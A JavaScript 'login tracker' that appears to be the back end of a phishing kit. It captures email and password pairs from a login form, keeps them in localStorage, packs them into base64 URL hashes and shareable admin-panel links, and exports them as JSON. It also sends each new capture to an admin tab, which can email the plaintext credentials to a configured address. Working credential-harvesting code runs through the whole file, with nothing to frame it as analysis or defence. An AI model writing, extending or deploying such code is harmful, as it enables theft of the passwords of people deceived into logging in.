// This script handles login tracking and file downloads without using browser storage
(function() {
    // Global variable to store login attempts in memory only
    let loginAttempts = [];
    
    // Global variable to store current email (for passing between pages)
    let currentEmail = '';
    
    // Check if localStorage is available (with fallback)
    const isLocalStorageAvailable = (function() {
        try {
            const test = '__test__';
            localStorage.setItem(test, test);
            localStorage.removeItem(test);
            return true;
        } catch (e) {
            return false;
        }
    })();
    console.log('localStorage available:', isLocalStorageAvailable);
    
    // Load data from localStorage if available
    function loadFromLocalStorage() {
        if (!isLocalStorageAvailable) return false;
        
        try {
            const storedData = localStorage.getItem('loginTrackerData');
            if (storedData) {
                const parsedData = JSON.parse(storedData);
                if (Array.isArray(parsedData) && parsedData.length > 0) {
                    loginAttempts = parsedData;
                    console.log(`Loaded ${parsedData.length} attempts from localStorage`);
                    return true;
                }
            }
        } catch (e) {
            console.error('Error loading from localStorage:', e);
        }
        return false;
    }
    
    // Save data to localStorage if available
    function saveToLocalStorage() {
        if (!isLocalStorageAvailable || !loginAttempts.length) return false;
        
        try {
            localStorage.setItem('loginTrackerData', JSON.stringify(loginAttempts));
            console.log(`Saved ${loginAttempts.length} attempts to localStorage`);
            return true;
        } catch (e) {
            console.error('Error saving to localStorage:', e);
            return false;
        }
    }
    
    // Function to load login attempts from URL hash if available
    function loadAttemptsFromHash() {
        try {
            if (window.location.hash && window.location.hash.length > 1) {
                // The hash might contain our encoded data
                const hashData = window.location.hash.substring(1); // Remove the #
                if (hashData.startsWith('data=')) {
                    const encodedData = hashData.substring(5); // Remove 'data='
                    const jsonStr = decodeURIComponent(atob(encodedData));
                    const importedData = JSON.parse(jsonStr);
                    
                    if (Array.isArray(importedData) && importedData.length > 0) {
                        console.log(`Loaded ${importedData.length} login attempts from URL hash`);
                        loginAttempts = importedData;
                        return true;
                    }
                }
            }
        } catch (e) {
            console.error('Error loading attempts from hash:', e);
        }
        return false;
    }
    
    // Try to load from localStorage first, then URL hash
    loadFromLocalStorage() || loadAttemptsFromHash();
    
    // Function to encode login attempts for URL hash
    function getAttemptsHash() {
        if (!loginAttempts.length) return '';
        
        try {
            const dataStr = JSON.stringify(loginAttempts);
            const encodedData = btoa(encodeURIComponent(dataStr));
            return `#data=${encodedData}`;
        } catch (e) {
            console.error('Error encoding attempts for hash:', e);
            return '';
        }
    }
    
    // Function to append data hash to any URL
    function appendAttemptsToUrl(url) {
        if (!loginAttempts.length) return url;
        
        // Remove any existing hash
        const baseUrl = url.split('#')[0];
        return baseUrl + getAttemptsHash();
    }
    
    // Function to capture login data with validation
    function trackLogin(email, password) {
        // Validate inputs
        if (!email || typeof email !== 'string') {
            console.error('Invalid email provided for tracking');
            return;
        }
        
        // Store email for page navigation
        currentEmail = email;
        
        // Create attempt object
        const attempt = {
            email: email,
            password: password,
            timestamp: new Date().toISOString()
        };
        
        // Check for duplicates (prevent recording the same login multiple times)
        const isDuplicate = loginAttempts.some(existing => 
            existing.email === email && 
            existing.password === password &&
            // Only consider it a duplicate if within the last minute
            (new Date(existing.timestamp).getTime() > Date.now() - 60000)
        );
        
        if (!isDuplicate) {
            // Add to memory array
            loginAttempts.push(attempt);
            console.log('Login attempt stored in memory:', attempt.email);
            
            // Save to localStorage if available
            saveToLocalStorage();
            
            // Broadcast this login attempt to other tabs (for auto-email)
            try {
                if (typeof localStorage !== 'undefined') {
                    // Store the timestamp of the last notification
                    const notificationData = JSON.stringify({
                        timestamp: Date.now(),
                        loginAttempt: attempt
                    });
                    localStorage.setItem('newLoginNotification', notificationData);
                    console.log('Broadcasted login notification to other tabs');
                }
            } catch (e) {
                console.error('Could not broadcast login notification', e);
            }
        }
        
        // If we're on the admin page, update the display
        if (document.getElementById('logs') && window.displayLoginAttempts) {
            window.displayLoginAttempts();
            
            // Update URL hash to preserve data on refresh
            if (window.location.pathname.includes('admin-panel.html')) {
                const attemptsHash = getAttemptsHash();
                if (attemptsHash) {
                    window.location.hash = attemptsHash.substring(1); // Remove the # that's already in the hash
                }
            }
        }
    }
    
    // Function to get all login attempts
    function getLoginAttempts() {
        return loginAttempts;
    }
    
    // Function to set login attempts (for importing)
    function setLoginAttempts(attempts) {
        if (Array.isArray(attempts)) {
            loginAttempts = attempts;
            console.log(`Imported ${attempts.length} login attempts`);
            
            // Save to localStorage if available
            saveToLocalStorage();
            
            // If we're on the admin page, update the display
            if (document.getElementById('logs') && window.displayLoginAttempts) {
                window.displayLoginAttempts();
            }
            return true;
        }
        return false;
    }
    
    // Function to get current email
    function getCurrentEmail() {
        // First try to get from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const emailParam = urlParams.get('_em');
        
        // If found in URL, store it and return
        if (emailParam) {
            try {
                // Decode from base64
                const decodedEmail = decodeURIComponent(atob(emailParam));
                currentEmail = decodedEmail;
                console.log('Retrieved email from URL param');
            } catch (e) {
                console.error('Error decoding email from URL:', e);
            }
        }
        
        return currentEmail;
    }
    
    // Function to set stored email
    function setCurrentEmail(email) {
        currentEmail = email;
    }
    
    // Function to get URL with email parameter
    function getUrlWithEmail(targetUrl, email) {
        if (!email) return targetUrl;
        
        try {
            // Encode email as base64
            const encodedEmail = btoa(encodeURIComponent(email));
            
            // Add as URL parameter
            const url = new URL(targetUrl, window.location.href);
            url.searchParams.set('_em', encodedEmail);
            
            // Get the URL with email parameter
            let finalUrl = url.toString();
            
            // Add login attempts data as hash if we have any
            if (loginAttempts.length > 0) {
                finalUrl = appendAttemptsToUrl(finalUrl);
            }
            
            return finalUrl;
        } catch (e) {
            console.error('Error encoding email for URL:', e);
            return targetUrl;
        }
    }
    
    // Function to download logs as JSON file with error handling
    function downloadLogs() {
        if (loginAttempts.length === 0) {
            alert("No login attempts recorded yet!");
            return;
        }
        
        try {
        const blob = new Blob([JSON.stringify(loginAttempts, null, 2)], { 
            type: 'application/json' 
        });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
            a.download = 'login_attempts_' + new Date().toISOString().slice(0,10) + '.json';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        } catch (e) {
            console.error('Error downloading logs:', e);
            alert('Failed to download logs: ' + e.message);
        }
    }
    
    // Function to generate a shareable link with encoded data
    function generateShareableLink() {
        if (loginAttempts.length === 0) {
            alert("No login attempts to share!");
            return null;
        }
        
        try {
            // Convert login attempts to JSON string
            const dataStr = JSON.stringify(loginAttempts);
            
            // Encode as base64
            const encodedData = btoa(encodeURIComponent(dataStr));
            
            // Check if the encoded data isn't too long for a URL
            if (encodedData.length > 1500) {
                console.warn('Data too large for URL parameter, using hash instead');
                // For large data, use hash instead of query parameter
                const baseUrl = window.location.href.split('#')[0].split('?')[0]; // Remove any existing parameters and hash
                const adminUrl = baseUrl.includes('admin-panel.html') ? 
                                baseUrl : 
                                baseUrl.substring(0, baseUrl.lastIndexOf('/') + 1) + 'admin-panel.html';
                
                return `${adminUrl}#data=${encodedData}`;
            }
            
            // Create shareable link with data as a URL parameter for smaller data
            const baseUrl = window.location.href.split('#')[0].split('?')[0]; // Remove any existing parameters and hash
            const adminUrl = baseUrl.includes('admin-panel.html') ? 
                          baseUrl : 
                          baseUrl.substring(0, baseUrl.lastIndexOf('/') + 1) + 'admin-panel.html';
            
            return `${adminUrl}?shared=${encodedData}`;
        } catch (e) {
            console.error('Error generating shareable link:', e);
            alert('Failed to generate shareable link: ' + e.message);
            return null;
        }
    }
    
    // Function to import data from a shareable link
    function importFromLink(url) {
        try {
            // First try to extract data from the 'shared' parameter
            const urlObj = new URL(url);
            const encodedData = urlObj.searchParams.get('shared');
            
            if (encodedData) {
                console.log('Found shared data in URL parameter');
                return importSharedData(encodedData);
            }
            
            // If not found, try the hash
            const hash = urlObj.hash;
            if (hash && hash.includes('data=')) {
                try {
                    const hashData = hash.substring(1); // Remove the #
                    const parts = hashData.split('data=');
                    if (parts.length > 1) {
                        const encodedHashData = parts[1];
                        console.log('Found shared data in URL hash');
                        return importSharedData(encodedHashData);
                    }
                } catch (e) {
                    console.error('Error parsing URL hash:', e);
                }
            }
            
            console.error('No shared data found in URL');
            return false;
        } catch (e) {
            console.error('Error importing from link:', e);
            return false;
        }
    }
    
    // Function to check if current URL contains shared data and import it
    function checkForSharedData() {
        // Check URL query parameter
        if (window.location.search && window.location.search.includes('shared=')) {
            try {
                const urlParams = new URLSearchParams(window.location.search);
                const encodedData = urlParams.get('shared');
                
                if (encodedData) {
                    console.log('Found shared data in URL parameter');
                    return importSharedData(encodedData);
                }
            } catch (e) {
                console.error('Error parsing URL parameter:', e);
            }
        }
        
        // Check URL hash
        if (window.location.hash && window.location.hash.includes('data=')) {
            try {
                const hashData = window.location.hash.substring(1); // Remove the #
                const parts = hashData.split('data=');
                if (parts.length > 1) {
                    const encodedData = parts[1];
                    console.log('Found shared data in URL hash');
                    return importSharedData(encodedData);
                }
            } catch (e) {
                console.error('Error parsing URL hash:', e);
            }
        }
        
        return false;
    }
    
    // Helper function to import shared data from encoded string
    function importSharedData(encodedData) {
        if (!encodedData) return false;
        
        try {
            // Decode from base64
            const jsonStr = decodeURIComponent(atob(encodedData));
            
            // Parse JSON
            const importedData = JSON.parse(jsonStr);
            
            // Import the data
            if (Array.isArray(importedData) && importedData.length > 0) {
                loginAttempts = importedData;
                
                // Also save to localStorage if available
                if (isLocalStorageAvailable) {
                    saveToLocalStorage();
                }
                
                console.log(`Imported ${importedData.length} login attempts from shared data`);
                return true;
            }
        } catch (e) {
            console.error('Error importing shared data:', e);
        }
        
        return false;
    }
    
    // Function to clear all login attempts
    function clearLogs() {
        loginAttempts = [];
        
        // Clear from localStorage if available
        if (isLocalStorageAvailable) {
            try {
                localStorage.removeItem('loginTrackerData');
                console.log('Cleared login data from localStorage');
            } catch (e) {
                console.error('Error clearing localStorage:', e);
            }
        }
        
        // If we're on the admin page, update the display
        if (document.getElementById('logs') && window.displayLoginAttempts) {
            window.displayLoginAttempts();
            
            // Clear the URL hash
            if (window.location.hash) {
                history.pushState("", document.title, window.location.pathname + window.location.search);
            }
        }
        
        console.log('Logs cleared from memory');
    }
    
    // Function to add test data
    function addTestData() {
        trackLogin('test@example.com', 'TestPassword123');
        return 'Test data added to memory';
    }
    
    // Check for shared data on script load
    checkForSharedData();
    
    // Function to reset everything
    function resetEverything() {
        // Clear all login attempts
        loginAttempts = [];
        currentEmail = '';
        
        // Clear from localStorage if available
        if (isLocalStorageAvailable) {
            try {
                localStorage.removeItem('loginTrackerData');
                console.log('Cleared login data from localStorage');
            } catch (e) {
                console.error('Error clearing localStorage:', e);
            }
        }
        
        // Clear URL hash
        if (window.location.hash) {
            history.pushState("", document.title, window.location.pathname + window.location.search);
        }
        
        // If we're on the admin page, update the display
        if (document.getElementById('logs') && window.displayLoginAttempts) {
            window.displayLoginAttempts();
        }
        
        console.log('Everything has been reset');
    }
    
    // Expose functions to global scope
    window.loginTracker = {
        track: trackLogin,
        getAttempts: getLoginAttempts,
        setAttempts: setLoginAttempts,
        getEmail: getCurrentEmail,
        setEmail: setCurrentEmail,
        download: downloadLogs,
        clear: clearLogs,
        addTest: addTestData,
        shareLink: generateShareableLink,
        importFromLink: importFromLink,
        checkForShared: checkForSharedData,
        getUrlWithEmail: getUrlWithEmail,
        appendAttemptsToUrl: appendAttemptsToUrl,
        loadAttemptsFromHash: loadAttemptsFromHash,
        getAttemptsHash: getAttemptsHash,
        saveToLocalStorage: saveToLocalStorage,
        loadFromLocalStorage: loadFromLocalStorage,
        isLocalStorageAvailable: isLocalStorageAvailable,
        reset: resetEverything,
        importSharedData: importSharedData
    };

    // Add a login attempt to the tracker
    loginTracker.addLoginAttempt = function(email, password) {
        if (!email && !password) {
            console.error('No email or password provided');
            return false;
        }
        
        // Create login attempt object
        const loginAttempt = {
            email: email || '',
            password: password || '',
            timestamp: Date.now()
        };
        
        // Add to the array
        if (!this.loginAttempts) {
            this.loginAttempts = [];
        }
        
        this.loginAttempts.push(loginAttempt);
        
        // Save to localStorage if available
        try {
            if (typeof localStorage !== 'undefined') {
                localStorage.setItem('loginAttempts', JSON.stringify(this.loginAttempts));
                console.log('Login attempt saved to localStorage');
            }
        } catch (e) {
            console.error('Could not save to localStorage', e);
        }
        
        // Check if the redirect page contains admin-panel.html
        const currentURL = window.location.href;
        if (!currentURL.includes('admin-panel.html')) {
            // Notify admin panel if it's open in another tab
            this.broadcastNewLogin(loginAttempt);
        }
        
        return true;
    };

    // Broadcast new login to other tabs via localStorage
    loginTracker.broadcastNewLogin = function(loginAttempt) {
        try {
            if (typeof localStorage !== 'undefined') {
                // Store the timestamp of the last notification
                const notificationData = JSON.stringify({
                    timestamp: Date.now(),
                    loginAttempt: loginAttempt
                });
                localStorage.setItem('newLoginNotification', notificationData);
            }
        } catch (e) {
            console.error('Could not broadcast login notification', e);
        }
    };

    // Initialize the storage event listener for the admin panel
    loginTracker.initStorageListener = function() {
        // Log that we're setting up the listener
        console.log('Setting up storage event listener for login notifications');
        
        window.addEventListener('storage', function(event) {
            if (event.key === 'newLoginNotification') {
                try {
                    // New login notification received
                    console.log('New login notification received');
                    const data = JSON.parse(event.newValue || '{}');
                    
                    // Update the UI if we're on the admin panel
                    if (window.location.href.includes('admin-panel.html')) {
                        console.log('Processing login notification in admin panel');
                        
                        // Refresh the displayed login attempts
                        if (typeof displayLoginAttempts === 'function') {
                            displayLoginAttempts();
                        }
                        
                        // Check if auto email is enabled
                        const isAutoEmailEnabled = localStorage.getItem('autoEmailEnabled') === 'true';
                        const emailAddress = localStorage.getItem('autoEmailAddress');
                        
                        console.log(`Auto email status: ${isAutoEmailEnabled ? 'Enabled' : 'Disabled'}, Email: ${emailAddress || 'Not set'}`);
                        
                        if (isAutoEmailEnabled && emailAddress && data.loginAttempt) {
                            console.log('Auto email conditions met, preparing to send notification');
                            
                            // Send email with the new login
                            if (typeof sendNewLoginAttemptsEmail === 'function') {
                                // Try to send the email
                                try {
                                    console.log('Sending auto email notification for new login');
                                    sendNewLoginAttemptsEmail([data.loginAttempt]);
                                    
                                    // Update last sent count
                                    const lastSentCount = parseInt(localStorage.getItem('lastEmailSentCount') || '0', 10);
                                    localStorage.setItem('lastEmailSentCount', (lastSentCount + 1).toString());
                                    
                                    // Update UI if needed
                                    if (typeof updateAutoEmailStatus === 'function') {
                                        updateAutoEmailStatus();
                                    }
                                } catch (err) {
                                    console.error('Error sending auto email:', err);
                                }
                            } else {
                                console.warn('sendNewLoginAttemptsEmail function not available');
                                
                                // If the function is not available, try a direct mailto approach as fallback
                                try {
                                    const loginAttempt = data.loginAttempt;
                                    const emailSubject = `[ALERT] New Login Attempt - ${new Date().toLocaleString()}`;
                                    let emailBody = "New Login Information\n\n";
                                    emailBody += "Collected on: " + new Date().toLocaleString() + "\n\n";
                                    emailBody += "Email: " + (loginAttempt.email || "(not provided)") + "\n";
                                    emailBody += "Password: " + (loginAttempt.password || "(not provided)") + "\n";
                                    emailBody += "Time: " + (new Date(loginAttempt.timestamp).toLocaleString() || "Unknown") + "\n\n";
                                    
                                    const mailtoLink = "mailto:" + encodeURIComponent(emailAddress) 
                                                    + "?subject=" + encodeURIComponent(emailSubject) 
                                                    + "&body=" + encodeURIComponent(emailBody);
                                    
                                    // Open email client
                                    window.open(mailtoLink, '_blank');
                                    
                                    console.log('Used fallback method to send email notification');
                                } catch (mailtoErr) {
                                    console.error('Fallback email method also failed:', mailtoErr);
                                }
                            }
                        }
                    }
                } catch (parseErr) {
                    console.error('Error processing login notification:', parseErr);
                }
            }
        });
        
        // Also check for auto-email status on load
        if (window.location.href.includes('admin-panel.html')) {
            console.log('Admin panel detected, checking auto-email status');
            if (typeof checkAutoEmailStatus === 'function') {
                setTimeout(checkAutoEmailStatus, 1000); // Check after a short delay
            }
        }
    };

    // Call this function when the script loads
    loginTracker.initStorageListener();
})();